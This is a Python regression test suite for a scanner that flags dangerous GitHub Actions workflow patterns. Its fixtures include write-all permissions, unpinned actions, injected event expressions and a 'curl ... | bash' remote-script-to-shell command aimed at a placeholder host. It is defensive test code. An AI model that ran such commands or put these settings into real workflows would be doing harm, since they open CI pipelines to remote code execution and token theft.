"""Static non-network regression tests for the owner-wide ESSENCE workflow scanner."""
import importlib.util
from pathlib import Path
import unittest

spec=importlib.util.spec_from_file_location(
    "essence_security",
    str(Path(__file__).resolve().parents[1]/"tools/essence_v52_security_fleet.py"))
m=importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)

class SecurityScannerTests(unittest.TestCase):
    def test_find_high_risk_patterns_without_exposing_secrets(self):
        cases = {
          "on:\n  pull_request_target:\n": "PULL_REQUEST_TARGET_REVIEW",
          "on:\n  workflow_run:\npermissions:\n  contents: write\n": "WORKFLOW_RUN_WITH_WRITE_SCOPE",
          "permissions: write-all\n": "WRITE_ALL_PERMISSION",
          "- uses: actions/checkout@v4\n": "ACTION_REF_NOT_SHA_PINNED",
          "run: curl -L https://example.invalid/install.sh | bash\n": "REMOTE_SCRIPT_PIPE_TO_SHELL",
          "run: echo " + "$" + "{{ github.event.pull_request.title }}\n": "UNTRUSTED_EVENT_EXPRESSION",
          "  persist-credentials: true\n": "EXPLICIT_PERSIST_GITHUB_TOKEN",
        }
        for source, needle in cases.items():
            with self.subTest(needle=needle):
                rules={rule for _line,rule in m.classify(source)}
                self.assertIn(needle,rules)

    def test_sha_pinned_actions_not_flagged(self):
        action="a"*40
        source=f"- uses: actions/checkout@{action}\n"
        self.assertNotIn("ACTION_REF_NOT_SHA_PINNED",
                         {r for _line,r in m.classify(source)})

    def test_comment_not_counted(self):
        source="# - uses: actions/checkout@v4\n# permissions: write-all\n"
        self.assertEqual(list(m.classify(source)),[])

    def test_remote_code_never_runs_in_scanner(self):
        self.assertNotIn("subprocess", m.inspect_file.__code__.co_names)
        self.assertNotIn("exec", m.inspect_file.__code__.co_names)
        self.assertNotIn("eval", m.inspect_file.__code__.co_names)

if __name__ == "__main__":
    unittest.main()
